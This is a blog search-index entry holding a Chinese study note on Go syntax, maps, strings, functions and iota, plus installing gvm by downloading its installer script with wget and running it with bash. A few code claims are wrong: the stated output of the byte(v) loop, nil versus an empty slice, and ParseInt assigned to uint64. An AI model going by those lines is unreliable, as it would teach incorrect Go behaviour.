<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>go语言学习</title>
    <url>/blogs/2021-04-11-goStudy/</url>
    <content><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>此篇主要讲解go的通用语法和一些linux专属操作，windows专属操作可以看 <a href="/blogs/2023-06-05-go-for-windows">go for windows</a></p>
<h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1. 环境"></a>1. 环境</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; go version</span><br><span class="line">go version go1.16.4 linux/amd64</span><br></pre></td></tr></table></figure>

<h2 id="2-安装gvm版本管理工具"><a href="#2-安装gvm版本管理工具" class="headerlink" title="2. 安装gvm版本管理工具"></a>2. 安装gvm版本管理工具</h2><h3 id="2-1-安装"><a href="#2-1-安装" class="headerlink" title="2.1. 安装"></a>2.1. 安装</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/moovweb/gvm/master/binscripts/gvm-installer</span><br><span class="line">bash gvm-installer</span><br></pre></td></tr></table></figure>

<ul>
<li>默认生效到<code>~/.bashrc</code>，生效到zsh需要将下面一句话加到<code>.zshrc</code>最后</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[[ -s &quot;/home/wangyubo/.gvm/scripts/gvm&quot; ]] &amp;&amp; source &quot;/home/wangyubo/.gvm/scripts/gvm&quot;</span><br></pre></td></tr></table></figure>

<h3 id="2-2-使用"><a href="#2-2-使用" class="headerlink" title="2.2. 使用"></a>2.2. 使用</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看可安装的版本</span></span><br><span class="line">gvm listall</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看当前版本</span></span><br><span class="line">gvm list</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装一个版本</span></span><br><span class="line">gvm install go1.18.3</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用一个版本，回归默认就是 gvm use system</span></span><br><span class="line">gvm use go1.18.3</span><br></pre></td></tr></table></figure>

<h1 id="二、语法相关"><a href="#二、语法相关" class="headerlink" title="二、语法相关"></a>二、语法相关</h1><h2 id="1-基本类型"><a href="#1-基本类型" class="headerlink" title="1. 基本类型"></a>1. 基本类型</h2><h3 id="1-1-去除变量未定义提示"><a href="#1-1-去除变量未定义提示" class="headerlink" title="1.1. 去除变量未定义提示"></a>1.1. 去除变量未定义提示</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">_ = varA</span><br></pre></td></tr></table></figure>

<h4 id="1-2-int"><a href="#1-2-int" class="headerlink" title="1.2. int"></a>1.2. int</h4><h5 id="1-大小"><a href="#1-大小" class="headerlink" title="1) 大小"></a>1) 大小</h5><ul>
<li>32位下int为4个字节，64位下int为8个字节</li>
</ul>
<h5 id="2-类型转换"><a href="#2-类型转换" class="headerlink" title="2) 类型转换"></a>2) 类型转换</h5><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 转string</span></span><br><span class="line">fmt.Sprint(<span class="number">123</span>)</span><br></pre></td></tr></table></figure>

<h3 id="1-2-类型转换"><a href="#1-2-类型转换" class="headerlink" title="1.2. 类型转换"></a>1.2. 类型转换</h3><h4 id="float32-float64"><a href="#float32-float64" class="headerlink" title="float32 float64"></a>float32 float64</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 转int</span></span><br><span class="line"><span class="keyword">var</span> f <span class="type">float32</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">var</span> a <span class="type">int</span> = <span class="type">int</span>(f)</span><br></pre></td></tr></table></figure>

<h4 id="byte"><a href="#byte" class="headerlink" title="[]byte"></a>[]byte</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 转string</span></span><br><span class="line">data := []<span class="type">byte</span>(<span class="string">&quot;aaa&quot;</span>)</span><br><span class="line">str := <span class="type">string</span>(data)</span><br></pre></td></tr></table></figure>

<h4 id="interface"><a href="#interface" class="headerlink" title="interface"></a>interface</h4><p><strong>类型判断</strong></p>
<p>类型断言</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> f <span class="keyword">interface</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> _, ok = f.(<span class="type">string</span>); !ok &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;f type is not string&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>switch类型判断</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> f <span class="keyword">interface</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> f := f.(<span class="keyword">type</span>) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="type">string</span>:</span><br><span class="line">	fmt.Println(<span class="string">&quot;f type is string&quot;</span>)</span><br><span class="line">	f = <span class="string">&quot;xxx&quot;</span>	<span class="comment">// 这里的f为string类型</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="type">int</span>:</span><br><span class="line">	fmt.Println(<span class="string">&quot;f type is int&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">	fmt.Println(<span class="string">&quot;f type is unknown&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-2-string"><a href="#1-2-string" class="headerlink" title="1.2. string"></a>1.2. string</h3><h4 id="1-转换"><a href="#1-转换" class="headerlink" title="1) 转换"></a>1) 转换</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 转[]byte</span></span><br><span class="line"><span class="keyword">var</span> jsonStr <span class="type">string</span></span><br><span class="line">jsonByte := []<span class="type">byte</span>(jsonStr)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 转byte</span></span><br><span class="line">testByte := jsonStr[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">// 转uint64</span></span><br><span class="line"><span class="comment">// The bitSize argument specifies the integer type</span></span><br><span class="line"><span class="comment">// that the result must fit into. Bit sizes 0, 8, 16, 32, and 64</span></span><br><span class="line"><span class="comment">// correspond to uint, uint8, uint16, uint32, and uint64.</span></span><br><span class="line"><span class="keyword">var</span> num <span class="type">uint64</span></span><br><span class="line">num, err := strconv.ParseUint(<span class="string">&quot;1234&quot;</span>, <span class="number">10</span>, <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 转int64</span></span><br><span class="line"><span class="comment">// The bitSize argument specifies the integer type</span></span><br><span class="line"><span class="comment">// that the result must fit into. Bit sizes 0, 8, 16, 32, and 64</span></span><br><span class="line"><span class="comment">// correspond to int, int8, int16, int32, and int64.</span></span><br><span class="line"><span class="keyword">var</span> num <span class="type">uint64</span></span><br><span class="line">num, err := strconv.ParseInt(<span class="string">&quot;1234&quot;</span>, <span class="number">10</span>, <span class="number">64</span>)</span><br></pre></td></tr></table></figure>

<h4 id="2-单引号，双引号，反引号的区别"><a href="#2-单引号，双引号，反引号的区别" class="headerlink" title="2) 单引号，双引号，反引号的区别"></a>2) 单引号，双引号，反引号的区别</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;%c %d\n&quot;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span>)	<span class="comment">// 单引号代表byte</span></span><br><span class="line">    fmt.Printf(<span class="string">&quot;a\n&quot;</span>)				<span class="comment">// 双引号可以输入转义字符</span></span><br><span class="line">    fmt.Printf(<span class="string">&quot;%s\n&quot;</span>, <span class="string">`a\n`</span>)		<span class="comment">// 反引号会忽略转义</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">a 97</span><br><span class="line">a</span><br><span class="line">a\n</span><br></pre></td></tr></table></figure>

<h4 id="2-字符串截取"><a href="#2-字符串截取" class="headerlink" title="2) 字符串截取"></a>2) 字符串截取</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">outStr := <span class="string">&quot;abcdefg&quot;</span></span><br><span class="line">fmt.Println(outStr[<span class="number">0</span>])		<span class="comment">// 97，被识别成byte打印了</span></span><br><span class="line">fmt.Println(outStr[:<span class="number">3</span>])		<span class="comment">// abc</span></span><br><span class="line">fmt.Println(outStr[<span class="number">3</span>:<span class="number">5</span>])	<span class="comment">// de</span></span><br><span class="line">fmt.Println(outStr[<span class="number">5</span>:])		<span class="comment">// fg</span></span><br><span class="line"></span><br><span class="line">fmt.Println(outStr[:<span class="number">-2</span>])	<span class="comment">// 不支持，索引仅支持正数</span></span><br></pre></td></tr></table></figure>

<h4 id="3-遍历"><a href="#3-遍历" class="headerlink" title="3) 遍历"></a>3) 遍历</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">s := <span class="string">&quot;abc&quot;</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="keyword">range</span>(s) &#123;</span><br><span class="line">	fmt.Println(i)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 输出</span></span><br><span class="line"><span class="comment">0</span></span><br><span class="line"><span class="comment">1</span></span><br><span class="line"><span class="comment">2</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, v := <span class="keyword">range</span>(s) &#123;</span><br><span class="line">	fmt.Println(i, <span class="type">byte</span>(v))</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 输出</span></span><br><span class="line"><span class="comment">0 a</span></span><br><span class="line"><span class="comment">1 b</span></span><br><span class="line"><span class="comment">2 c</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h4 id="4-修改"><a href="#4-修改" class="headerlink" title="4) 修改"></a>4) 修改</h4><ul>
<li>string类型里面的元素是不可变的，除非赋值一个新的string</li>
<li>如果想要修改string中某一个元素，相当于拷贝了两次</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">a := <span class="string">&quot;abc&quot;</span></span><br><span class="line">tmp := []<span class="type">byte</span>(a)	<span class="comment">// 做了一次拷贝</span></span><br><span class="line">tmp[<span class="number">0</span>] = <span class="string">&#x27;z&#x27;</span></span><br><span class="line">fmt.Println(a)		<span class="comment">// abc</span></span><br><span class="line">a = <span class="type">string</span>(tmp)		<span class="comment">// 又拷贝了一次</span></span><br><span class="line">fmt.Println(a)		<span class="comment">// zbc</span></span><br></pre></td></tr></table></figure>

<h2 id="2-map"><a href="#2-map" class="headerlink" title="2. map"></a>2. map</h2><ul>
<li>底层使用哈希map实现而非红黑树</li>
</ul>
<h3 id="2-1-一些基本操作"><a href="#2-1-一些基本操作" class="headerlink" title="2.1. 一些基本操作"></a>2.1. 一些基本操作</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">/****** map初始化 ******/</span></span><br><span class="line">xxxMap := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="keyword">interface</span>&#123;&#125;)</span><br><span class="line">check := <span class="keyword">map</span>[<span class="type">byte</span>]<span class="type">byte</span>&#123;</span><br><span class="line">	<span class="string">&#x27;)&#x27;</span>: <span class="string">&#x27;(&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;[&#x27;</span>: <span class="string">&#x27;]&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;&#123;&#x27;</span>: <span class="string">&#x27;&#125;&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/****** 判断map是否存在key ******/</span></span><br><span class="line"><span class="keyword">if</span> _, ok := xxxMap[key]; ok &#123;</span><br><span class="line">    <span class="comment">// 存在key</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/****** 遍历map ******/</span></span><br><span class="line"><span class="comment">// key, value</span></span><br><span class="line"><span class="keyword">for</span> key, value := <span class="keyword">range</span> xxxMap &#123;</span><br><span class="line">    <span class="comment">// 操作map</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 只要key</span></span><br><span class="line"><span class="keyword">for</span> key := <span class="keyword">range</span> xxxMap &#123;</span><br><span class="line">	<span class="comment">// do something</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-2-map取不存在的值"><a href="#2-2-map取不存在的值" class="headerlink" title="2.2. map取不存在的值"></a>2.2. map取不存在的值</h3><ul>
<li>对map取值可以获取一个返回值也可以获取两个返回值用于判断是否存在</li>
<li>如果不存在采用一个返回值会返回对应value的类型的默认值</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	boolMap := <span class="keyword">map</span>[<span class="type">int</span>]<span class="type">bool</span>&#123;&#125;</span><br><span class="line">	intMap := <span class="keyword">map</span>[<span class="type">int</span>]<span class="type">int</span>&#123;&#125;</span><br><span class="line">	stringMap := <span class="keyword">map</span>[<span class="type">int</span>]<span class="type">string</span>&#123;&#125;</span><br><span class="line">	sliceMap := <span class="keyword">map</span>[<span class="type">int</span>][]<span class="type">int</span>&#123;&#125;</span><br><span class="line">	mapMap := <span class="keyword">map</span>[<span class="type">int</span>]<span class="keyword">map</span>[<span class="type">int</span>]<span class="type">int</span>&#123;&#125;</span><br><span class="line">	interfaceMap := <span class="keyword">map</span>[<span class="type">int</span>]<span class="keyword">interface</span>&#123;&#125;&#123;&#125;</span><br><span class="line">	fmt.Println(boolMap[<span class="number">1</span>])                      <span class="comment">// false</span></span><br><span class="line">	fmt.Println(intMap[<span class="number">1</span>])                       <span class="comment">// 0</span></span><br><span class="line">	fmt.Println(stringMap[<span class="number">1</span>])                    <span class="comment">//</span></span><br><span class="line">	fmt.Println(sliceMap[<span class="number">1</span>], sliceMap[<span class="number">1</span>] == <span class="literal">nil</span>) <span class="comment">// [] true</span></span><br><span class="line">	fmt.Println(mapMap[<span class="number">1</span>], mapMap[<span class="number">1</span>] == <span class="literal">nil</span>)     <span class="comment">// map[] true</span></span><br><span class="line">	fmt.Println(interfaceMap[<span class="number">1</span>])                 <span class="comment">// &lt;nil&gt;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-3-底层实现"><a href="#2-3-底层实现" class="headerlink" title="2.3. 底层实现"></a>2.3. 底层实现</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// /usr/lib/go/src/cmd/compile/internal/types/type.go</span></span><br><span class="line"><span class="comment">// Map contains Type fields specific to maps.</span></span><br><span class="line"><span class="keyword">type</span> Map <span class="keyword">struct</span> &#123;</span><br><span class="line">	Key  *Type <span class="comment">// Key type</span></span><br><span class="line">	Elem *Type <span class="comment">// Val (elem) type</span></span><br><span class="line"></span><br><span class="line">	Bucket *Type <span class="comment">// internal struct type representing a hash bucket</span></span><br><span class="line">	Hmap   *Type <span class="comment">// internal struct type representing the Hmap (map header object)</span></span><br><span class="line">	Hiter  *Type <span class="comment">// internal struct type representing hash iterator state</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// /usr/lib/go/src/runtime/map.go</span></span><br><span class="line"><span class="comment">// A header for a Go map.</span></span><br><span class="line"><span class="keyword">type</span> hmap <span class="keyword">struct</span> &#123;</span><br><span class="line">	<span class="comment">// Note: the format of the hmap is also encoded in cmd/compile/internal/reflectdata/reflect.go.</span></span><br><span class="line">	<span class="comment">// Make sure this stays in sync with the compiler&#x27;s definition.</span></span><br><span class="line">	count     <span class="type">int</span> <span class="comment">// # live cells == size of map.  Must be first (used by len() builtin)</span></span><br><span class="line">	flags     <span class="type">uint8</span></span><br><span class="line">	B         <span class="type">uint8</span>  <span class="comment">// log_2 of # of buckets (can hold up to loadFactor * 2^B items)</span></span><br><span class="line">	noverflow <span class="type">uint16</span> <span class="comment">// approximate number of overflow buckets; see incrnoverflow for details</span></span><br><span class="line">	hash0     <span class="type">uint32</span> <span class="comment">// hash seed</span></span><br><span class="line"></span><br><span class="line">	buckets    unsafe.Pointer <span class="comment">// array of 2^B Buckets. may be nil if count==0.</span></span><br><span class="line">	oldbuckets unsafe.Pointer <span class="comment">// previous bucket array of half the size, non-nil only when growing</span></span><br><span class="line">	nevacuate  <span class="type">uintptr</span>        <span class="comment">// progress counter for evacuation (buckets less than this have been evacuated)</span></span><br><span class="line"></span><br><span class="line">	extra *mapextra <span class="comment">// optional fields</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// /usr/lib/go/src/cmd/compile/internal/types/type.go</span></span><br><span class="line"><span class="comment">// NewMap returns a new map Type with key type k and element (aka value) type v.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewMap</span><span class="params">(k, v *Type)</span></span> *Type &#123;</span><br><span class="line">	t := newType(TMAP)</span><br><span class="line">	mt := t.MapType()</span><br><span class="line">	mt.Key = k</span><br><span class="line">	mt.Elem = v</span><br><span class="line">	<span class="keyword">if</span> k.HasTParam() || v.HasTParam() &#123;</span><br><span class="line">		t.SetHasTParam(<span class="literal">true</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> k.HasShape() || v.HasShape() &#123;</span><br><span class="line">		t.SetHasShape(<span class="literal">true</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> t</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// /usr/lib/go/src/cmd/compile/internal/types/type.go</span></span><br><span class="line"><span class="comment">// New returns a new Type of the specified kind.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">newType</span><span class="params">(et Kind)</span></span> *Type &#123;</span><br><span class="line">	t := &amp;Type&#123;</span><br><span class="line">		kind:  et,</span><br><span class="line">		width: BADWIDTH,</span><br><span class="line">	&#125;</span><br><span class="line">	t.underlying = t</span><br><span class="line">	<span class="comment">// TODO(josharian): lazily initialize some of these?</span></span><br><span class="line">	<span class="keyword">switch</span> t.kind &#123;</span><br><span class="line">	<span class="keyword">case</span> TMAP:</span><br><span class="line">		t.extra = <span class="built_in">new</span>(Map)</span><br><span class="line">    ...</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> t</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul>
<li><code>var xxx map[string]interface&#123;&#125;</code>定义的xxx是一个空指针，没有指向任何地址，不能进行赋值</li>
<li>初始化map需要使用make</li>
</ul>
<h2 id="3-array"><a href="#3-array" class="headerlink" title="3. array"></a>3. array</h2><h3 id="3-1-一些基本操作"><a href="#3-1-一些基本操作" class="headerlink" title="3.1. 一些基本操作"></a>3.1. 一些基本操作</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">/****** array初始化 ******/</span></span><br><span class="line">arr0 := [...]<span class="type">int</span>&#123;<span class="number">0</span>, <span class="number">1</span>&#125;</span><br><span class="line">arr1 := [...]<span class="type">int</span>&#123;<span class="number">0</span>, <span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/****** 遍历 ******/</span></span><br><span class="line"><span class="keyword">for</span> _, v := <span class="keyword">range</span> arr0 &#123;</span><br><span class="line">	fmt.Println(v)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="5-流程控制语句"><a href="#5-流程控制语句" class="headerlink" title="5. 流程控制语句"></a>5. 流程控制语句</h2><h3 id="5-1-for-循环"><a href="#5-1-for-循环" class="headerlink" title="5.1. for 循环"></a>5.1. for 循环</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 死循环</span></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// for i 形式</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(a); i++ &#123;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 遍历</span></span><br><span class="line"><span class="keyword">for</span> _, v := <span class="keyword">range</span>(arr) &#123;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// do while</span></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">	...</span><br><span class="line">	<span class="keyword">if</span> expression &#123;</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// while</span></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> expression &#123;</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	&#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="5-2-switch"><a href="#5-2-switch" class="headerlink" title="5.2. switch"></a>5.2. switch</h3><ul>
<li>case多条件写成逗号形式，c那样的写法不适用</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> v.key &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;Maker&quot;</span>:</span><br><span class="line">	...</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;OS&quot;</span>:</span><br><span class="line">	...</span><br><span class="line"><span class="comment">// 多条件判断</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;linuxOS&quot;</span>, <span class="string">&quot;linuxKernel&quot;</span>, <span class="string">&quot;linuxArch&quot;</span>:</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="6-函数"><a href="#6-函数" class="headerlink" title="6. 函数"></a>6. 函数</h2><h3 id="6-1-定义和返回值"><a href="#6-1-定义和返回值" class="headerlink" title="6.1. 定义和返回值"></a>6.1. 定义和返回值</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 正常定义</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">test</span><span class="params">(a <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> a + <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 多返回值</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">test</span><span class="params">(a <span class="type">int</span>)</span></span> (<span class="type">int</span>, <span class="type">int</span>) &#123;</span><br><span class="line">	<span class="keyword">return</span> a+<span class="number">1</span>, a<span class="number">-1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// nil 返回初始化定义，仅对slice和map生效</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">test</span><span class="params">(a <span class="type">int</span>)</span></span> []<span class="type">int</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span>	<span class="comment">// 相当于return []int&#123;&#125;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 返回值提前声明</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">test</span><span class="params">(a <span class="type">int</span>)</span></span> (result <span class="type">int</span>) &#123;</span><br><span class="line">	result = a + <span class="number">1</span></span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="6-2-值传递"><a href="#6-2-值传递" class="headerlink" title="6.2. 值传递"></a>6.2. 值传递</h3><h4 id="1-go函数都是值传递"><a href="#1-go函数都是值传递" class="headerlink" title="(1) go函数都是值传递"></a>(1) go函数都是值传递</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">changeDatas</span><span class="params">(intData <span class="type">int</span>, strData <span class="type">string</span>, arrData [3]<span class="type">int</span>)</span></span> &#123;</span><br><span class="line">	intData += <span class="number">2</span></span><br><span class="line">	strData += <span class="string">&quot;bbb&quot;</span></span><br><span class="line">	arrData[<span class="number">0</span>] = <span class="number">999</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	intData := <span class="number">1</span></span><br><span class="line">	strData := <span class="string">&quot;aaa&quot;</span></span><br><span class="line">	arrData := [...]<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line">	fmt.Println(intData, strData, arrData)</span><br><span class="line">	changeDatas(intData, strData, arrData)</span><br><span class="line">	fmt.Println(intData, strData, arrData)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 aaa [1 2 3]</span><br><span class="line">1 aaa [1 2 3]</span><br></pre></td></tr></table></figure>

<h4 id="2-slice、map、channel类型的看似引用传递的解释"><a href="#2-slice、map、channel类型的看似引用传递的解释" class="headerlink" title="(2) slice、map、channel类型的看似引用传递的解释"></a>(2) slice、map、channel类型的看似引用传递的解释</h4><h5 id="slice"><a href="#slice" class="headerlink" title="slice"></a>slice</h5><ul>
<li>slice本质是一个结构体，内部包含三要素：长度、容量、数据首地址</li>
<li>所以传递的也是这三个值，数据内容改变改的是地址里面的内容，外部可见，但是改了长度和容量，外部就不会变</li>
</ul>
<img src="2022-02-18-01.jpg">

<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">changeDatas</span><span class="params">(sliceData []<span class="type">int</span>, mapData <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span>)</span></span> &#123;</span><br><span class="line">	sliceData[<span class="number">0</span>] = <span class="number">999</span></span><br><span class="line">	mapData[<span class="string">&quot;test&quot;</span>] = <span class="number">123</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	sliceData := []<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line">	mapData := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span>)</span><br><span class="line">	fmt.Println(sliceData, mapData)</span><br><span class="line">	changeDatas(sliceData, mapData)</span><br><span class="line">	fmt.Println(sliceData, mapData)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[1 2 3] map[]</span><br><span class="line">[999 2 3] map[test:123]</span><br></pre></td></tr></table></figure>

<h5 id="map和channel都是指针"><a href="#map和channel都是指针" class="headerlink" title="map和channel都是指针"></a>map和channel都是指针</h5><ul>
<li>本质上map和channel都是指针，所以改动外部都可见</li>
</ul>
<h2 id="7-组合赋值"><a href="#7-组合赋值" class="headerlink" title="7. 组合赋值"></a>7. 组合赋值</h2><ul>
<li>组合赋值会先将值取出再赋值给前面的变量，所以go不需要swap方法</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">a, b := <span class="number">1</span>+<span class="number">1</span>, <span class="number">2</span>+<span class="number">2</span></span><br><span class="line"><span class="comment">// 交换两个元素的值</span></span><br><span class="line">a, b = b, a</span><br></pre></td></tr></table></figure>

<h2 id="8-i-、i–"><a href="#8-i-、i–" class="headerlink" title="8. i++、i–"></a>8. i++、i–</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">i++		<span class="comment">// 理解成 i+=1</span></span><br><span class="line">j=i++	<span class="comment">// error，i++是i+=1，是语句，非表达式，不能赋值</span></span><br><span class="line">++i		<span class="comment">// error，不存在++i</span></span><br></pre></td></tr></table></figure>

<h2 id="9-const-iota"><a href="#9-const-iota" class="headerlink" title="9. const &amp; iota"></a>9. const &amp; iota</h2><h3 id="9-1-itoa"><a href="#9-1-itoa" class="headerlink" title="9.1. itoa"></a>9.1. itoa</h3><p>参考<a href="https://www.jianshu.com/p/aad37a6c81a2">golang const 内itoa 用法详解及优劣分析</a></p>
<h4 id="1-每次-const-出现时，都会让-iota-初始化为0"><a href="#1-每次-const-出现时，都会让-iota-初始化为0" class="headerlink" title="(1) 每次 const 出现时，都会让 iota 初始化为0"></a>(1) 每次 const 出现时，都会让 iota 初始化为0</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> a = <span class="literal">iota</span> <span class="comment">// a = 0</span></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">  b = <span class="literal">iota</span>     <span class="comment">// b = 0</span></span><br><span class="line">  c            <span class="comment">// c = 1</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h4 id="2-自定义类型"><a href="#2-自定义类型" class="headerlink" title="(2) 自定义类型"></a>(2) 自定义类型</h4><p>自增长常量经常包含一个自定义枚举类型，允许你依靠编译器完成自增设置。</p>
